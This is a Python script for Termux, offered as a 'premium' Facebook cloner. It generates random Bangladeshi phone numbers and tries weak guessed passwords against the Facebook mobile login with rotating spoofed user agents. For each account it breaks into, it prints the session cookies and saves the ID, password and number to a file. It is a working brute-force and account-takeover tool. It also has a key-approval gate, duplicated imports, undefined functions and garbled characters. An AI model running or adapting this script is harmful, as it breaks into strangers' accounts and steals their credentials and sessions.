#coding by ALEN XESAN
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [âœ“] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [âœ“] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [âœ“] installing bs4 !...\n')
    os.system('pip install bs4')
    os.system('git pull')
    os.system('pkg install curl')
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
R = '\033[31;1m'
RED = '\x1b[38;5;46m'
G = '\033[32;1m'
Y = '\033[33;1m'
B = '\033[34;1m'
M = '\033[35;1m'
C = '\033[36;1m'
R = '{RED}' 
LR = '\033[91;1m'
LG = '\033[92;1m'
LY = '\033[93;1m'
LB = '\033[94;1m'
LM = '\033[95;1m'
LC = '\033[96;1m'
dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://d.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
for xd in range(3005):
    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
    uas.append(ff)
for sat in range(1000):
	a='NokiaX'
	b=random.randrange(1,9)
	c='-0'
	d=random.randrange(1,9)
	e='/'
	f=random.randrange(1,9)
	g='.0 ('
	h=random.randrange(1,12)
	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
	j='UNTRUSTED/'
	k=random.randrange(1,3)
	l='.0'
	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
	ugen.append(uaku2)

nka = [
"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
]


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
        
        
def main_apv():

    imt="OKAY-BYE"

    ak="ALEN-XESAN"

    os.system('clear')

    print(logo)

    try:

        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()
    except IOError:
        os.system("clear")
        print(logo)
        print ("ï¿½ï¿½")
        print ("YOUR TOKEN IS NOT APROVAL")     
        print ("         THIS IS YOUR TOKEN")
        print ("ï¿½ï¿½")
        print ("")
        myid=uuid.uuid4().hex[:10].upper()
        print ("          YOUR KEY : "+ak+myid+imt)
        print ("ï¿½ï¿½")
        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
        print ("")
        print ("  Copy Key And Sent Me on MESSENGER to Approvel Your Key ")
        print ("ï¿½ï¿½")
        time.sleep(3.5)
        tks = 'Dear%20ALEN SIR,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt

        os.system('am start https://m.me/ALEN.OKH' + tks)

        

    r1=requests.get("https://github.com/XESAN-VAU/RANDOM-FIRE-APPROVAL/blob/main/FIRE.txt").text

    if key1 in r1:

        R()

    else:

        os.system("clear")
  
logo=(""" 
\033[1;97m╔════════════════════════════════╗   
\033[1;97m║ \033[1;95m╔═╗╦  ╔═╗╔╗╔  ═╗ ╦╔═╗╔═╗╔═╗╔╗╔\033[1;97m ║
\033[1;97m║ \033[1;92m╠═╣║  ║╣ ║║║  ╔╩╦╝║╣ ╚═╗╠═╣║║║ \033[1;97m║
\033[1;97m║ \033[1;93m╩ ╩╩═╝╚═╝╝╚╝  ╩ ╚═╚═╝╚═╝╩ ╩╝╚╝ \033[1;97m║
\033[1;97m╚════════════════════════════════╝
\033[1;97m╔══════════════════════════════════════╗   
\033[1;97m║\033[1;95m  Owner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mALEN XESAN \033[1;90m<\033[1;92m•\033[1;90m> \033[1;95mversion 1.0\033[1;97m║
\033[1;97m╚══════════════════════════════════════╝
\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;37m│ ❲\033[1;92m★\033[1;97m❳ AUTHOR   : \033[1;92mALEN XESAN             \033[1;97m│ 
\033[1;37m│ ❲\033[1;92m★\033[1;97m❳ FACEBOOK : \033[1;92mALEN🙂😈               \033[1;97m│
\033[1;37m│ ❲\033[1;92m★\033[1;97m❳ WHATSAPP : \033[1;92m+88015*******4         \033[1;97m│
\033[1;37m│ ❲\033[1;92m★\033[1;97m❳ TOOLS    : \033[1;32mGAME ID CLONER  \033[1;37m       │
\033[1;37m│ ❲\033[1;92m★\033[1;97m❳ VERSION  : \033[1;35m 8\033[1;35mK \033[1;32mPREMIUM  \033[1;37m          │
\033[1;93m└━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┘""")
def cek_apk(session,coki):
	w=session.get("https://d.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\rðŸŽ® %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://d.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r ðŸŽ® %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
def Main():
	os.system('clear')
	print(logo)
	print("[\033[1;93mA\33[1;92m] START RANDOM CLONING")
	print("[\033[1;93mB\33[1;92m] JOIN MY FACEBOOK GROUP")
	print("[\033[1;93mC\33[1;92m] CONTACT ME ON MESSENGER")
	print("[\033[1;93mD\33[1;92m] MY FACEBOOK")
	print('[\033[1;93mE\33[1;92m] EXIT PROGRAMMING')
	print(54*'â”')
	opt = input('Choose option >>> ')
	if opt in ["A","1"]:
		ASRAF()
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/groups/647831005946417');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://m.me/ALEN.OKH');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
		
	else:
		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
		Main()
def admin():
	os.system('clear')
	print(logo)
	print(50*'_')
	print(' [1] Contract MESSENGER ')
	print(' [2] JOIN MY FACEBOOK GROUP')
	print(' [0] Back to Main menu')
	bal = input('Choose option >>> ')
	if bal =='1':
		os.system('xdg-open https://m.me/ALWN.OKH');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/groups/647831005946417');time.sleep(1)
		admin()
	if bal =='0':
		Main()
		
def ASRAF():
	user=[]
	os.system('clear')
	print(logo)
	print(" â”â”[â€¢] BD SIM CODE 017 015 018 019 013 015 016]")
	kode = input(' â”—â”[+] SELECT : ')
	doamin = ' BD Number id cloner [ONLY-OK] '
	print(' â”â”[â€¢] EXAMPLE : 1000,5000,10000,15000,20000] ')
	limit = int(input(' â”—â”[+] LIMIT : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=60) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('â”â”[â€¢] COUNTRY    : Bangladesh')
		print('â”£â”[â€¢] TOTAL ID   :  '+tl)
		print(f'â”£â”[â€¢] SIM CODE   : \033[1;92m {kode} ')
		print('â”—â”[â€¢] START BD UID MIXED CRACKING... ')
		print(50*'â”')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you']
			yaari.submit(b,uid,pwx,tl)
	print(50*'_')
	print(' [ðŸ’‰] Crack process has been completed')
	print(' [ðŸ’‰] Ids saved in ok.txt,cp.txt')
	print(50*'_')
	exit()

def b(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mALEN\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://d.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'd.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="115", "Google Chrome";v="115"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,}
            lo = session.post('https://d.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [ALEN-ðŸ’š] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[ðŸ’™]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/ALEN-OKðŸ’¥.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
    except:

        pass
Main()
